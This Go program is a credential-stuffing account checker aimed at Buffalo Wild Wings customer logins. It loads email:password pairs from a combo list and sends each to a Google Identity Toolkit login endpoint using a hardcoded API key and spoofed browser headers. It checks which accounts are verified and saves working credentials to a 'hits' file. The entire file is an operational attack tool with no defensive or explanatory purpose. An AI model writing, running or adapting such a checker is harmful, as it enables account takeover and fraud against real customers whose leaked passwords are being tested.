package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
)

func checker(email string, password string) {
	u := "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCmtykcZ6UTfD0vvJ05IpUVe94uIaUQdZ4"
	data := map[string]string{"email": email, "password": password, "returnSecureToken": "true"}
	headers := map[string]string{
		"content-type":     "application/json",
		"origin":           "https://www.buffalowildwings.com",
		"referer":          "https://www.buffalowildwings.com/",
		"user-agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.85",
		"x-client-version": "Opera/JsCore/8.3.0/FirebaseCore-web",
	}
	json_data, _ := json.Marshal(data)
	req, _ := http.NewRequest("POST", u, bytes.NewBuffer(json_data))
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	client := &http.Client{}
	r, e := client.Do(req)
	if e != nil {
		fmt.Println("[!] Failed To Send Request")
	}
	body, err := io.ReadAll(r.Body)
	if err != nil {
		fmt.Println(err)
		return
	}

	if r.StatusCode == 200 {
		type jd struct {
			IDToken string `json:"idToken"`
			Name    string `json:"displayName"`
		}
		var j jd
		e = json.Unmarshal(body, &j)
		if e != nil {
			return
		}

		auth := j.IDToken
		name := j.Name
		d2 := map[string]string{"idToken": auth}
		j2, _ := json.Marshal(d2)

		req2, _ := http.NewRequest("POST", u, bytes.NewBuffer(j2))
		for k, v := range headers {
			req2.Header.Set(k, v)
		}
		client := &http.Client{}
		r2, e2 := client.Do(req2)
		if e2 != nil {
			fmt.Println("[!] Failed To Send Request")
		}
		if r2.StatusCode == 200 {
			type jd2 struct {
				Ver string `json:"emailVerified"`
			}
			var res2 jd2
			body2, err := io.ReadAll(r2.Body)
			if err != nil {
				fmt.Println(err)
				return
			}
			e = json.Unmarshal(body2, &res2)
			if e != nil {
				return
			}

			verfied_question_mark := res2.Ver

			acc := "[+] Email: " + email + " | Password: " + password + " | Name -> " + name + " | Verfied -> " + verfied_question_mark
			fmt.Println(acc)
			f, err := os.OpenFile("hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer f.Close()

			_, err = io.WriteString(f, acc+"\n")
			if err != nil {
				fmt.Println(err)
				return
			}

		} else {
			acc := "[+] Email: " + email + " | Password: " + password + " | Name -> " + name
			fmt.Println(acc)
			f, err := os.OpenFile("hits.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}
			defer f.Close()

			_, err = io.WriteString(f, acc+"\n")
			if err != nil {
				fmt.Println(err)
				return
			}
		}

	} else if r.StatusCode == 400 {
		fmt.Println("[-] Email:", email, "| Password:", password)
	} else {
		fmt.Println("[!] Rate Limited")
	}
}

func main() {
	var hi string

	f, e := os.Open("combo.txt")
	if e != nil {
		return
	}
	s := bufio.NewScanner(f)
	accounts := 0
	for s.Scan() {
		accounts++
	}

	fmt.Println("Accounts:", accounts, "\nType Any Key And Press Enter To Start Checking > ")
	fmt.Scan(&hi)

	f2, e2 := os.Open("combo.txt")
	if e2 != nil {
		return
	}
	s2 := bufio.NewScanner(f2)

	for s2.Scan() {
		c := s2.Text()
		acc := strings.Split(c, ":")
		checker(acc[0], acc[1])
	}

	var exit string

	fmt.Println("\n Stopped Checking | Type Any Key and Press Enter To Close > ")
	fmt.Scan(&exit)
}
